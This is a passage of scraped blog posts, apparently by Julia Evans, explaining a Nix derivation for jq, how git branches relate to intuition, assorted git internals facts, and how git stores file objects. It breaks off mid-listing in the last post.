and probably lots more useful things I don’t know about yet \n\n let’s look at the derivation for  jq \n\n Let’s look at one more compiled derivation, for  jq . This is quite long but there\nare some interesting things in here. I wanted to look at this because I wanted to see what a more typical derivation generated by  stdenv.mkDerivation  looked like. \n\n $ nix show-derivation /nix/store/q9cw5rp0ibpl6h4i2qaq0vdjn4pyms3p-jq-1.6.drv\n{\n  \"/nix/store/q9cw5rp0ibpl6h4i2qaq0vdjn4pyms3p-jq-1.6.drv\": {\n    \"outputs\": {\n      \"bin\": { \"path\": \"/nix/store/vabn35a2m2qmfi9cbym4z50bwq94fdzm-jq-1.6-bin\" },\n      \"dev\": { \"path\": \"/nix/store/akda158i8gr0v0w397lwanxns8yrqldy-jq-1.6-dev\" },\n      \"doc\": { \"path\": \"/nix/store/6qimafz8q88l90jwrzciwc27zhjwawcl-jq-1.6-doc\" },\n      \"lib\": { \"path\": \"/nix/store/3wzlsin34l1cs70ljdy69q9296jnvnas-jq-1.6-lib\" },\n      \"man\": { \"path\": \"/nix/store/dl1xf9w928jai5hvm5s9ds35l0m26m0k-jq-1.6-man\" },\n      \"out\": { \"path\": \"/nix/store/ivzm5rrr7riwvgy2xcjhss6lz55qylnb-jq-1.6\" }\n    },\n    \"inputSrcs\": [\n      \"/nix/store/6xg259477c90a229xwmb53pdfkn6ig3g-default-builder.sh\",\n      \"/nix/store/jd98q1h1rxz5iqd5xs8k8gw9zw941lj6-fix-tests-when-building-without-regex-supports.patch\"\n    ],\n    \"inputDrvs\": {\n      \"/nix/store/0lbzkxz56yhn4gv5z0sskzzdlwzkcff8-autoreconf-hook.drv\": [ \"out\" ],\n      \"/nix/store/6wh5w7hkarfcx6fxsdclmlx097xsimmg-jq-1.6.tar.gz.drv\": [ \"out\" ],\n      \"/nix/store/87a32xgqw85rxr1fx3c5j86y177hr9sr-oniguruma-6.9.8.drv\": [ \"dev\" ],\n      \"/nix/store/gkpdv7xl39x9yxch0wjarq19mmv7j1pm-bash-5.2-p15.drv\": [ \"out\" ],\n      \"/nix/store/xn1mjk78ly9wia23yvnsyw35q1mz4jqh-stdenv-darwin.drv\": [ \"out\" ]\n    },\n    \"system\": \"aarch64-darwin\",\n    \"builder\": \"/nix/store/0q1jfjlwr4vig9cz7lnb5il9rg0y1n84-bash-5.2-p15/bin/bash\",\n    \"args\": [\n      \"-e\",\n      \"/nix/store/6xg259477c90a229xwmb53pdfkn6ig3g-default-builder.sh\"\n    ],\n    \"env\": {\n      \"__darwinAllowLocalNetworking\": \"\",\n      \"__impureHostDeps\": \"/bin/sh /usr/lib/libSystem.B.dylib /usr/lib/system/libunc.dylib /dev/zero /dev/random /dev/urandom /bin/sh\",\n      \"__propagatedImpureHostDeps\": \"\",\n      \"__propagatedSandboxProfile\": \"\",\n      \"__sandboxProfile\": \"\",\n      \"__structuredAttrs\": \"\",\n      \"bin\": \"/nix/store/vabn35a2m2qmfi9cbym4z50bwq94fdzm-jq-1.6-bin\",\n      \"buildInputs\": \"/nix/store/xfnl6xqbvnpacx8hw9d99ca4mly9kp0h-oniguruma-6.9.8-dev\",\n      \"builder\": \"/nix/store/0q1jfjlwr4vig9cz7lnb5il9rg0y1n84-bash-5.2-p15/bin/bash\",\n      \"cmakeFlags\": \"\",\n      \"configureFlags\": \"--bindir=${bin}/bin --sbindir=${bin}/bin --datadir=${doc}/share --mandir=${man}/share/man\",\n      \"depsBuildBuild\": \"\",\n      \"depsBuildBuildPropagated\": \"\",\n      \"depsBuildTarget\": \"\",\n      \"depsBuildTargetPropagated\": \"\",\n      \"depsHostHost\": \"\",\n      \"depsHostHostPropagated\": \"\",\n      \"depsTargetTarget\": \"\",\n      \"depsTargetTargetPropagated\": \"\",\n      \"dev\": \"/nix/store/akda158i8gr0v0w397lwanxns8yrqldy-jq-1.6-dev\",\n      \"doCheck\": \"\",\n      \"doInstallCheck\": \"1\",\n      \"doc\": \"/nix/store/6qimafz8q88l90jwrzciwc27zhjwawcl-jq-1.6-doc\",\n      \"installCheckTarget\": \"check\",\n      \"lib\": \"/nix/store/3wzlsin34l1cs70ljdy69q9296jnvnas-jq-1.6-lib\",\n      \"man\": \"/nix/store/dl1xf9w928jai5hvm5s9ds35l0m26m0k-jq-1.6-man\",\n      \"mesonFlags\": \"\",\n      \"name\": \"jq-1.6\",\n      \"nativeBuildInputs\": \"/nix/store/ni9k35b9llfc3hys8nv5qsipw8pfy1ln-autoreconf-hook\",\n      \"out\": \"/nix/store/ivzm5rrr7riwvgy2xcjhss6lz55qylnb-jq-1.6\",\n      \"outputs\": \"bin doc man dev lib out\",\n      \"patches\": \"/nix/store/jd98q1h1rxz5iqd5xs8k8gw9zw941lj6-fix-tests-when-building-without-regex-supports.patch\",\n      \"pname\": \"jq\",\n      \"postInstallCheck\": \"$bin/bin/jq --help >/dev/null\\n$bin/bin/jq -r '.values[1]' <<< '{\\\"values\\\":[\\\"hello\\\",\\\"world\\\"]}' | grep '^world$' > /dev/null\\n\",\n      \"preBuild\": \"rm -r ./modules/oniguruma\\n\",\n      \"preConfigure\": \"echo \\\"#!/bin/sh\\\" > scripts/version\\necho \\\"echo 1.6\\\" >> scripts/version\\npatchShebangs scripts/version\\n\",\n      \"propagatedBuildInputs\": \"\",\n      \"propagatedNativeBuildInputs\": \"\",\n      \"src\": \"/nix/store/ggjlgjx2fw29lngbnvwaqr6hiz1qhy8g-jq-1.6.tar.gz\",\n      \"stdenv\": \"/nix/store/qrz2mnb2gsnzmw2pqax693daxh5hsgap-stdenv-darwin\",\n      \"strictDeps\": \"\",\n      \"system\": \"aarch64-darwin\",\n      \"version\": \"1.6\"\n    }\n  }\n}\n \n\n I thought it was interesting that some of the environment variables in here are actually bash scripts themselves – for example the  postInstallCheck  environment variable is a bash script.\nThose bash script environment variables are  eval ed in the main bash script (you can  see that happening in setup.sh here ) \n\n The  postInstallCheck  environment variable in this particular derivation starts like this: \n\n $bin/bin/jq --help >/dev/null\n$bin/bin/jq -r '.values[1]' <<< '{\"values\":[\"hello\",\"world\"]}' | grep '^world$' > /dev/null\n \n\n I guess this is a test to make sure that  jq  installed correctly. \n\n finally: clean up \n\n All of my compiler experiments used about 3GB of disk space, but  nix-collect-garbage  cleaned up all of it. \n\n let’s recap the process! \n\n I feel like I understand Nix a bit better after going through this. I still\ndon’t feel very motivated to learn the Nix language, but now I have some\nidea of what Nix programs are actually doing under the hood! \n\n My understanding is: \n\n \n First,  .nix  files get compiled into a  .drv  file, which is mostly a bunch of inputs and outputs and environment variables. This is where the Nix language stops being relevant. \n Then all the environment variables get passed to a build script, which is in charge of doing the actual build \n In the Nix standard environment ( stdenv ), some of those environment variables are themselves bash code, which gets  eval ed by the big build script  setup.sh \n \n\n That’s all! I probably made some mistakes in here, but this was kind of a fun rabbit hole. \n\n"},
{"url": "https://jvns.ca/blog/2023/11/23/branches-intuition-reality/", "title": "git branches: intuition & reality", "content": "\n     \n\n Hello! I’ve been working on writing a zine about git so I’ve been thinking\nabout git branches a lot. I keep hearing from people that they find the way git\nbranches work to be counterintuitive. It got me thinking:  what might an\n“intuitive” notion of a branch be, and how is it different from how git\nactually works? \n\n So in this post I want to briefly talk about \n\n \n an intuitive mental model I think many people have \n how git actually represents branches internally (“branches are a pointer to a commit” etc) \n how the “intuitive model” and the real way it works are actually pretty closely related \n some limits of the intuitive model and why it might cause problems \n \n\n Nothing in this post is remotely groundbreaking so I’m going to try to keep it pretty short. \n\n an intuitive model of a branch \n\n Of course, people have many different intuitions about branches. Here’s the one\nthat I think corresponds most closely to the physical “a branch of an\napple tree” metaphor. \n\n My guess is that a lot of people think about a git branch like this: the 2\ncommits in pink in this picture are on a “branch”. \n\n \n\n I think there are two important things about this diagram: \n\n \n the branch has 2 commits on it \n the branch has a “parent” ( main ) which it’s an offshoot of \n \n\n That seems pretty reasonable, but that’s not how git defines a branch – most\nimportantly, git doesn’t have any concept of a branch’s “parent”. So how does\ngit define a branch? \n\n in git, a branch is the full history \n\n In git, a branch is the full history of every previous commit, not just the “offshoot” commits. So in our picture above both branches ( main  and  branch ) have 4 commits on them. \n\n I made an example repository at  https://github.com/jvns/branch-example  which\nhas its branches set up the same way as in the picture above. Let’s look at the\n2 branches: \n\n main  has 4 commits on it: \n\n $ git log --oneline main\n70f727a d\nf654888 c\n3997a46 b\na74606f a\n \n\n and  mybranch  has 4 commits on it too. The bottom two commits are shared\nbetween both branches. \n\n $ git log --oneline mybranch\n13cb960 y\n9554dab x\n3997a46 b\na74606f a\n \n\n So  mybranch  has 4 commits on it, not just the 2 commits  13cb960  and  9554dab  that are “offshoot” commits. \n\n You can get git to draw all the commits on both branches like this: \n\n $ git log --all --oneline --graph\n* 70f727a (HEAD -> main, origin/main) d\n* f654888 c\n| * 13cb960 (origin/mybranch, mybranch) y\n| * 9554dab x\n|/\n* 3997a46 b\n* a74606f a\n \n\n a branch is stored as a commit ID \n\n Internally in git, branches are stored as tiny text files which have a commit ID in\nthem. That commit is the latest commit on the branch. This is the “technically correct” definition I was talking about at the beginning. \n\n Let’s look at the text files for  main  and  mybranch  in our example repo: \n\n $ cat .git/refs/heads/main\n70f727acbe9ea3e3ed3092605721d2eda8ebb3f4\n$ cat .git/refs/heads/mybranch\n13cb960ad86c78bfa2a85de21cd54818105692bc\n \n\n This makes sense:  70f727  is the latest commit on  main  and  13cb96  is the latest commit on  mybranch . \n\n The reason this works is that every commit contains a pointer to its parent(s),\nso git can follow the chain of pointers to get every commit on the branch. \n\n Like I mentioned before, the thing that’s missing here is any relationship at\nall between these two branches. There’s no indication that  mybranch  is an\noffshoot of  main . \n\n Now that we’ve talked about how the intuitive notion of a branch is “wrong”, I\nwant to talk about how it’s also right in some very important ways. \n\n people’s intuition is usually not that wrong \n\n I think it’s pretty popular to tell people that their intuition about git is\n“wrong”. I find that kind of silly – in general, even if people’s intuition\nabout a topic is technically incorrect in some ways, people usually have the\nintuition they do for very legitimate reasons! “Wrong” models can be super useful. \n\n So let’s talk about 3 ways the intuitive “offshoot” notion of a branch matches\nup very closely with how we actually use git in practice. \n\n rebases use the “intuitive” notion of a branch \n\n Now let’s go back to our original picture. \n\n \n\n When you rebase  mybranch  on  main , it takes the commits on the “intuitive”\nbranch (just the 2 pink commits) and replays them onto  main . \n\n The result is that just the 2 ( x  and  y ) get copied. Here’s what that looks like: \n\n $ git switch mybranch\n$ git rebase main\n$ git log --oneline mybranch\n952fa64 (HEAD -> mybranch) y\n7d50681 x\n70f727a (origin/main, main) d\nf654888 c\n3997a46 b\na74606f a\n \n\n Here  git rebase  has created two new commits ( 952fa64  and  7d50681 ) whose\ninformation comes from the previous two  x  and  y  commits. \n\n So the intuitive model isn’t THAT wrong! It tells you exactly what happens in a\nrebase. \n\n But because git doesn’t know that  mybranch  is an offshoot of  main , you need\nto tell it explicitly where to rebase the branch. \n\n merges use the “intuitive” notion of a branch too \n\n Merges don’t copy commits, but they do need a “base” commit: the way merges\nwork is that it looks at two sets of changes (starting from the shared base)\nand then merges them. \n\n Let’s undo the rebase we just did and then see what the merge base is. \n\n $ git switch mybranch\n$ git reset --hard 13cb960  # undo the rebase\n$ git merge-base main mybranch\n3997a466c50d2618f10d435d36ef12d5c6f62f57\n \n\n This gives us the “base” commit where our branch branched off,  3997a4 .\nThat’s exactly the commit you would think it might be based on our intuitive\npicture. \n\n github pull requests also use the intuitive idea \n\n If we create a pull request on GitHub to merge  mybranch  into  main , it’ll\nalso show us 2 commits: the commits  x  and  y . That makes sense and also\nmatches our intuitive notion of a branch. \n\n \n\n I assume if you make a merge request on GitLab it shows you something similar. \n\n intuition is pretty good, but it has some limits \n\n This leaves our intuitive definition of a branch looking pretty good actually!\nThe “intuitive” idea of what a branch is matches exactly with how merges and\nrebases and GitHub pull requests work. \n\n You do need to explicitly\nspecify the other branch when merging or rebasing or making a pull request (like  git rebase main ),\nbecause git doesn’t know what branch you think your offshoot is based on. \n\n But the intuitive notion of a branch has one fairly serious problem: the way\nyou intuitively think about  main  and an offshoot branch are very different,\nand git doesn’t know that. \n\n So let’s talk about the different kinds of git branches. \n\n trunk and offshoot branches \n\n To a human,  main  and  mybranch  are pretty different, and you probably have\npretty different intentions around how you want to use them. \n\n I think it’s pretty normal to think of some branches as being “trunk” branches,\nand some branches as being “offshoots”. Also you can have an offshoot of an\noffshoot. \n\n Of course, git itself doesn’t make any such distinctions (the term “offshoot”\nis one I just made up!), but what kind of a branch it is definitely affects how\nyou treat it. \n\n For example: \n\n \n you might rebase  mybranch  onto  main  but you probably wouldn’t rebase  main  onto  mybranch  – that would be weird! \n in general people are much more careful around rewriting the history on “trunk” branches than short-lived offshoot branches \n \n\n git lets you do rebases “backwards” \n\n One thing I think throws people off about git is – because git doesn’t\nhave any notion of whether a branch is an “offshoot” of another branch, it\nwon’t give you any guidance about if/when it’s appropriate to rebase branch X\non branch Y. You just have to know. \n\n for example, you can do either: \n\n $ git checkout main\n$ git rebase mybranch\n \n\n or \n\n $ git checkout mybranch\n$ git rebase main\n \n\n Git will happily let you do either one, even though in this case  git rebase main  is\nextremely normal and  git rebase mybranch  is pretty weird. A lot of people\nsaid they found this confusing so here’s a picture of the two kinds of rebases: \n\n \n\n Similarly, you can do merges “backwards”, though that’s much more normal than\ndoing a backwards rebase – merging  mybranch  into  main  and  main  into\n mybranch  are both useful things to do for different reasons. \n\n Here’s a diagram of the two ways you can merge: \n\n \n\n git’s lack of hierarchy between branches is a little weird \n\n I hear the statement “the  main  branch is not special” a lot and I’ve been\npuzzled about it – in most of the repositories I work in,  main   is \npretty special! Why are people saying it’s not? \n\n I think the point is that even though branches  do  have relationships\nbetween them ( main  is often special!), git doesn’t know anything about those\nrelationships. \n\n You have to tell git explicitly about the relationship between branches every\nsingle time you run a git command like  git rebase  or  git merge , and if you\nmake a mistake things can get really weird. \n\n I don’t know whether git’s design here is “right” or “wrong” (it definitely has\nsome pros and cons, and I’m very tired of reading endless arguments about\nit), but I do think it’s surprising to a lot of people for good reason. \n\n git’s UI around branches is weird too \n\n Let’s say you want to look at just the “offshoot” commits on a branch, which as\nwe’ve discussed is a completely normal thing to want. \n\n Here’s how to see just the 2 offshoot commits on our branch with  git log : \n\n $ git switch mybranch\n$ git log main..mybranch --oneline\n13cb960 (HEAD -> mybranch, origin/mybranch) y\n9554dab x\n \n\n You can look at the combined diff for those same 2 commits with  git diff  like this: \n\n $ git diff main...mybranch\n \n\n So to see the 2 commits  x  and  y  with  git log , you need to use 2 dots\n( .. ), but to look at the same commits with  git diff , you need to use 3 dots\n( ... ). \n\n Personally I can never remember what  ..  and  ...  mean so I just avoid\nthem completely even though in principle they seem useful. \n\n in GitHub, the default branch is special \n\n Also, it’s worth mentioning that GitHub does have a “special branch”: every\ngithub repo has a “default branch” (in git terms, it’s what  HEAD  points at),\nwhich is special in the following ways: \n\n \n it’s what you check out when you  git clone  the repository \n it’s the default destination for pull requests \n github will suggest that you protect the default branch from force pushes \n \n\n and probably even more that I’m not thinking of. \n\n that’s all! \n\n This all seems extremely obvious in retrospect, but it took me a long time to\nfigure out what a more “intuitive” idea of a branch even might be because I was\nso used to the technical “a branch is a reference to a commit” definition. \n\n I also hadn’t really thought about how git makes you tell it about the\nhierarchy between your branches every time you run a  git rebase  or  git\nmerge  command – for me it’s second nature to do that and it’s not a big deal,\nbut now that I’m thinking about it, it’s pretty easy to see how somebody could\nget mixed up. \n\n"},
{"url": "https://jvns.ca/blog/2023/10/20/some-miscellaneous-git-facts/", "title": "Some miscellaneous git facts", "content": "\n     \n\n I’ve been very slowly working on writing about how Git works. I thought I\nalready knew Git pretty well, but as usual when I try to explain something I’ve\nbeen learning some new things. \n\n None of these things feel super surprising in retrospect, but I hadn’t thought\nabout them clearly before. \n\n The facts are: \n\n \n the “index”, “staging area” and “–cached” are all the same thing \n the stash is a bunch of commits \n not all references are branches or tags \n merge commits aren’t empty \n \n\n Let’s talk about them! \n\n the “index”, “staging area” and “–cached” are all the same thing \n\n When you run  git add file.txt , and then  git status , you’ll see something like this: \n\n $ git add content/post/2023-10-20-some-miscellaneous-git-facts.markdown\n$ git status\nChanges to be committed:\n  (use \"git restore --staged <file>...\" to unstage)\n\tnew file:   content/post/2023-10-20-some-miscellaneous-git-facts.markdown\n \n\n People usually call this “staging a file” or “adding a file to the staging area”. \n\n When you stage a file with  git add , behind the scenes git adds the file to its object\ndatabase (in  .git/objects ) and updates a file called  .git/index  to refer to\nthe newly added file. \n\n This “staging area” actually gets referred to by 3 different names in Git. All\nof these refer to the exact same thing (the file  .git/index ): \n\n \n git diff --cached \n git diff --staged \n the file  .git/index \n \n\n I felt like I should have realized this earlier, but I didn’t, so there it is. \n\n the stash is a bunch of commits \n\n When I run  git stash  to stash my changes, I’ve always been a bit confused\nabout where those changes actually went. It turns out that when you run  git\nstash , git makes some commits with your changes and labels them with a reference\ncalled  stash  (in  .git/refs/stash ). \n\n Let’s stash this blog post and look at the log of the  stash  reference: \n\n $ git log stash --oneline\n6cb983fe (refs/stash) WIP on main: c6ee55ed wip\n2ff2c273 index on main: c6ee55ed wip\n... some more stuff\n \n\n Now we can look at the commit  2ff2c273  to see what it contains: \n\n $ git show 2ff2c273  --stat\ncommit 2ff2c273357c94a0087104f776a8dd28ee467769\nAuthor: Julia Evans <julia@jvns.ca>\nDate:   Fri Oct 20 14:49:20 2023 -0400\n\n    index on main: c6ee55ed wip\n\n content/post/2023-10-20-some-miscellaneous-git-facts.markdown | 40 ++++++++++++++++++++++++++++++++++++++++\n \n\n Unsurprisingly, it contains this blog post. Makes sense! \n\n git stash  actually creates 2 separate commits: one for the index, and one for\nyour changes that you haven’t staged yet. I found this kind of heartening\nbecause I’ve been working on a tool to snapshot and restore the state of a git\nrepository (that I may or may not ever release) and I came up with a very\nsimilar design, so that made me feel better about my choices. \n\n Apparently older commits in the stash are stored in the reflog. \n\n not all references are branches or tags \n\n Git’s documentation often refers to “references” in a generic way that I find\na little confusing sometimes. Personally 99% of the time when I deal with\na “reference” in Git it’s a branch or  HEAD  and the other 1% of the time it’s a tag. I\nactually didn’t know ANY examples of references that weren’t branches or tags or  HEAD . \n\n But now I know one example – the stash is a reference, and it’s not a branch\nor tag! So that’s cool. \n\n Here are all the references in my blog’s git repository (other than  HEAD ): \n\n $ find .git/refs -type f\n.git/refs/heads/main\n.git/refs/remotes/origin/HEAD\n.git/refs/remotes/origin/main\n.git/refs/stash\n \n\n Some other references people mentioned in reponses to this post: \n\n \n refs/notes/* , from   git notes \n refs/pull/123/head , and ` refs/pull/123/head  for GitHub pull requests  (which you can get with  git fetch origin refs/pull/123/merge ) \n refs/bisect/* , from  git bisect \n \n\n merge commits aren’t empty \n\n Here’s a toy git repo where I created two branches  x  and  y , each with 1\nfile ( x.txt  and  y.txt ) and merged them. Let’s look at the merge commit. \n\n $ git log --oneline\n96a8afb (HEAD -> y) Merge branch 'x' into y\n0931e45 y\n1d8bd2d (x) x\n \n\n If I run  git show 96a8afb , the commit looks “empty”: there’s no diff! \n\n git show 96a8afb\ncommit 96a8afbf776c2cebccf8ec0dba7c6c765ea5d987 (HEAD -> y)\nMerge: 0931e45 1d8bd2d\nAuthor: Julia Evans <julia@jvns.ca>\nDate:   Fri Oct 20 14:07:00 2023 -0400\n\n    Merge branch 'x' into y\n \n\n But if I diff the merge commit against each of its two parent commits\nseparately, you can see that of course there  is  a diff: \n\n $ git diff 0931e45 96a8afb   --stat\n x.txt | 1 +\n 1 file changed, 1 insertion(+)\n$ git diff 1d8bd2d 96a8afb   --stat\n y.txt | 1 +\n 1 file changed, 1 insertion(+)\n \n\n It seems kind of obvious in retrospect that merge commits aren’t actually “empty”\n(they’re snapshots of the current state of the repo, just like any other\ncommit), but I’d never thought about why they appear to be empty. \n\n Apparently the reason that these merge diffs are empty is that merge diffs only show  conflicts  – if I instead create a repo\nwith a merge conflict (one branch added  x  and another branch added  y  to the\nsame file), and show the merge commit where I resolved the conflict, it looks\nlike this: \n\n $ git show HEAD\ncommit 3bfe8311afa4da867426c0bf6343420217486594\nMerge: 782b3d5 ac7046d\nAuthor: Julia Evans <julia@jvns.ca>\nDate:   Fri Oct 20 15:29:06 2023 -0400\n\n    Merge branch 'x' into y\n\ndiff --cc file.txt\nindex 975fbec,587be6b..b680253\n--- a/file.txt\n+++ b/file.txt\n@@@ -1,1 -1,1 +1,1 @@@\n- y\n -x\n++z\n \n\n It looks like this is trying to tell me that one branch added  x , another\nbranch added  y , and the merge commit resolved it by putting  z  instead.  But\nin the earlier example, there was no conflict, so Git didn’t display a diff at all. \n\n \n(thanks to Jordi for telling me how merge diffs work)\n \n\n that’s all! \n\n I’ll keep this post short, maybe I’ll write another blog post with more git\nfacts as I learn them. \n\n"},
{"url": "https://jvns.ca/blog/2023/09/14/in-a-git-repository--where-do-your-files-live-/", "title": "In a git repository, where do your files live?", "content": "\n     \n\n Hello! I was talking to a friend about how git works today, and we got onto the\ntopic – where does git store your files? We know that it’s in your  .git \ndirectory, but where exactly in there are all the versions of your old files? \n\n For example, this blog is in a git repository, and it contains a file called\n content/post/2019-06-28-brag-doc.markdown . Where is that in my  .git  folder?\nAnd where are the old versions of that file? Let’s investigate by writing some\nvery short Python programs. \n\n git stores files in  .git/objects \n\n Every previous version of every file in your repository is in  .git/objects .\nFor example, for this blog,  .git/objects  contains 2700 files. \n\n $ find .git/objects/ -type f | wc -l\n2761\n \n\n \nnote:  .git/objects  actually has more information than “every previous version\nof every file in your repository”, but we’re not going to get into that just yet\n \n\n Here’s a very short Python program\n( find-git-object.py ) that\nfinds out where any given file is stored in  .git/objects . \n\n import hashlib\nimport sys\n\n\ndef object_path(content):\n    header = f\"blob {len(content)}\\0\"\n    data = header.encode() + content\n    digest = hashlib.sha1(data).hexdigest()\n    return f\".git/objects/{digest[:2]}/{digest[2:]}\"\n\n\nwith open(sys.argv[1], \"rb\") as f:\n    print(object_path(f.read()))\n \n\n What this does is: \n\n \n read the contents of the file \n calculate a header ( blob 16673\\0 ) and combine it with the contents \n calculate the sha1 sum ( e33121a9af82dd99d6d706d037204251d41d54  in this case) \n translate that sha1 sum into a path ( .git/objects/e3/3121a9af82dd99d6d706d037204251d41d54 ) \n \n\n We can run it like this: \n\n $ python3 find-git-object.py content/post/2019-06-28-brag-doc.markdown\n.git/objects/8a/e33121a9af82dd99d6d706d037204251d41d54\n \n\n jargon: “content addressed storage” \n\n The term for this storage strategy (where the filename of an object in the\ndatabase is the same as the hash of the file’s contents) is “content addressed\nstorage”. \n\n One neat thing about content addressed storage is that if I have two files (or\n50 files!) with the exact same contents, that doesn’t take up any extra space\nin Git’s database – if the hash of the contents is  aabbbbbbbbbbbbbbbbbbbbbbbbb , they’ll both be stored in  .git/objects/aa/bbbbbbbbbbbbbbbbbbbbb . \n\n how are those objects encoded? \n\n If I try to look at this file in  .git/objects , it gets a bit weird: \n\n $ cat .git/objects/8a/e33121a9af82dd99d6d706d037204251d41d54\nx^A<8D><9B>}s<E3>Ƒ<C6><EF>o|<8A>^Q<9D><EC>ju<92><E8><DD>\\<9C><9C>*<89>j<FD>^...\n \n\n What’s going on? Let’s run  file  on it: \n\n $ file .git/objects/8a/e33121a9af82dd99d6d706d037204251d41d54\n.git/objects/8a/e33121a9af82dd99d6d706d037204251d41d54: zlib compressed data\n \n\n It’s just compressed! We can write another little Python program called  decompress.py  that uses the  zlib  module to decompress the data: \n\n import zlib\nimport sys\n\nwith open(sys.argv[1], \"rb\") as f:\n    content = f.read()\n    print(zlib.decompress(content).decode())\n \n\n Now let’s decompress it: \n\n $ python3 decompress.py .git/objects/8a/e33121a9af82dd99d6d706d037204251d41d54 \nblob 16673---\ntitle: \"Get your work recognized: write a brag document\"\ndate: 2019-06-28T18:46:02Z\nurl: /blog/brag-documents/\ncategories: []\n---\n... the entire blog post ...\n \n\n So this data is encoded in a pretty simple way: there’s this\n blob 16673\\0  thing, and then the full contents of the file. \n\n there aren’t any diffs \n\n One thing that surprised me here is the first time I learned it: there aren’t\nany diffs here! That file is the 9th version of that blog post, but the version\ngit stores in the  .git/objects  is the whole file, not the diff from the\nprevious version. \n\n Git actually sometimes also does store files as diffs (when you run  git gc  it\ncan combine multiple different files into a “packfile” for efficiency), but I\nhave never needed to think about that in my life so we’re not going to get into\nit. Aditya Mukerjee has a great post called  Unpacking Git packfiles  about how the format works. \n\n what about older versions of the blog post? \n\n Now you might be wondering – if there are 8 previous versions of that blog\npost (before I fixed some typos), where are they in the  .git/objects \ndirectory? How do we find them? \n\n First, let’s find every commit where that file changed with  git log : \n\n $ git log --oneline  content/post/2019-06-28-brag-doc.markdown\nc6d4db2d\n423cd76a\n7e91d7d0\nf105905a\nb6d23643\n998a46dd\n67a26b04\nd9999f17\n026c0f52\n72442b67\n \n\n Now let’s pick a previous commit, let’s say  026c0f52 . Commits are also stored\nin  .git/objects , and we can try to look at it there. But the commit isn’t\nthere!  ls .git/objects/02/6c*  doesn’t have any results! You know how we\nmentioned “sometimes git packs objects to save space but we don’t need to worry\nabout it?“. I guess now is the time that we need to worry about it. \n\n So let’s take care of that. \n\n let’s unpack some objects \n\n So we need to unpack the objects from the pack files. I looked it up on Stack\nOverflow and apparently you can do it like this: \n\n $ mv .git/objects/pack/pack-adeb3c14576443e593a3161e7e1b202faba73f54.pack .\n$ git unpack-objects < pack-adeb3c14576443e593a3161e7e1b202faba73f54.pack\n \n\n This is weird repository surgery so it’s a bit alarming but I can always\njust clone the repository from Github again if I mess it up, so I wasn’t too\nworried. \n\n After unpacking all the object files, we end up with way more objects: about\n20000 instead of about 2700. Neat. \n\n find .git/objects/ -type f | wc -l\n20138\n \n\n back to looking at a commit \n\n Now we can go back to looking at our commit  026c0f52 . You know how we said\nthat not everything in  .git/objects  is a file? Some of them are commits! And\nto figure out where the old version of our post\n content/post/2019-06-28-brag-doc.markdown  is stored, we need to dig pretty\ndeep into this commit. \n\n The first step is to look at the commit in  .git/objects . \n\n commit step 1: look at the commit \n\n The commit  026c0f52  is now in\n .git/objects/02/6c0f5208c5ea10608afc9252c4a56c1ac1d7e4  after doing some\nunpacking and we can look at it like this: \n\n $ python3 decompress.py .git/objects/02/6c0f5208c5ea10608afc9252c4a56c1ac1d7e4\ncommit 211tree 01832a9109ab738dac78ee4e95024c74b9b71c27\nparent 72442b67590ae1fcbfe05883a351d822454e3826\nauthor Julia Evans <julia@jvns.ca> 1561998673 -0400\ncommitter Julia Evans <julia@jvns.ca> 1561998673 -0400\n\nbrag doc\n \n\n We can also get same information with  git cat-file -p 026c0f52 , which does the same thing but does a better job of formatting the data. (the  -p  option means “format it nicely please”) \n\n commit step 2: look at the tree \n\n This commit has a  tree . What’s that? Well let’s take a look. The tree’s ID\nis  01832a9109ab738dac78ee4e95024c74b9b71c27 , and we can use our\n decompress.py  script from earlier to look at that git object. (though I had to remove the  .decode()  to get the script to not crash) \n\n $ python3 decompress.py .git/objects/01/832a9109ab738dac78ee4e95024c74b9b71c27\nb'tree 396\\x00100644 .gitignore\\x00\\xc3\\xf7`$8\\x9b\\x8dO\\x19/\\x18\\xb7}|\\xc7\\xce\\x8e:h\\xad100644 README.md\\x00~\\xba\\xec\\xb3\\x11\\xa0^\\x1c\\xa9\\xa4?\\x1e\\xb9\\x0f\\x1cfG\\x96\\x0b\n \n\n This is formatted in kind of an unreadable way. The main display issue here is that\nthe commit hashes  ( \\xc3\\xf7$8\\x9b\\x8dO\\x19/\\x18\\xb7}|\\xc7\\xce\\ …) are raw\nbytes instead of being encoded in hexadecimal. So we see  \\xc3\\xf7$8\\x9b\\x8d \ninstead of  c3f76024389b8d . Let’s switch over to using  git cat-file -p  which\nformats the data in a friendlier way, because I don’t feel like writing a\nparser for that. \n\n $ git cat-file -p 01832a9109ab738dac78ee4e95024c74b9b71c27\n100644 blob c3f76024389b8d4f192f18b77d7cc7ce8e3a68ad\t.gitignore\n100644 blob 7ebaecb311a05e1ca9a43f1eb90f1c6647960bc1\tREADME.md\n100644 blob 0f21dc9bf1a73afc89634bac586271384e24b2c9\tRakefile\n100644 blob 00b9d54abd71119737d33ee5d29d81ebdcea5a37\tconfig.yaml\n040000 tree 61ad34108a327a163cdd66fa1a86342dcef4518e\tcontent <-- this is where we're going next\n040000 tree 6d8543e9eeba67748ded7b5f88b781016200db6f\tlayouts\n100644 blob 22a321a88157293c81e4ddcfef4844c6c698c26f\tmystery.rb\n040000 tree 8157dc84a37fca4cb13e1257f37a7dd35cfe391e\tscripts\n040000 tree 84fe9c4cb9cef83e78e90a7fbf33a9a799d7be60\tstatic\n040000 tree 34fd3aa2625ba784bced4a95db6154806ae1d9ee\tthemes\n \n\n This is showing us all of the files I had in the root directory of the\nrepository as of that commit. Looks like I accidentally committed some file\ncalled  mystery.rb  at some point which I later removed. \n\n Our file is in the  content  directory, so let’s look at that tree:  61ad34108a327a163cdd66fa1a86342dcef4518e \n\n commit step 3: yet another tree \n\n $ git cat-file -p 61ad34108a327a163cdd66fa1a86342dcef4518e\n\n040000 tree 1168078878f9d500ea4e7462a9cd29cbdf4f9a56\tabout\n100644 blob e06d03f28d58982a5b8282a61c4d3cd5ca793005\tnewsletter.markdown\n040000 tree 1f94b8103ca9b6714614614ed79254feb1d9676c\tpost <-- where we're going next!\n100644 blob 2d7d22581e64ef9077455d834d18c209a8f05302\tprofiler-project.markdown\n040000 tree 06bd3cee1ed46cf403d9d5a201232af5697527bb\tprojects\n040000 tree 65e9357973f0cc60bedaa511489a9c2eeab73c29\ttalks\n040000 tree 8a9d561d536b955209def58f5255fc7fe9523efd\tzines\n \n\n Still not done… \n\n commit step 4: one more tree…. \n\n The file we’re looking for is in the  post/  directory, so there’s one more tree: \n\n $ git cat-file -p 1f94b8103ca9b6714614614ed79254feb1d9676c\t\n.... MANY MANY lines omitted ...\n100644 blob 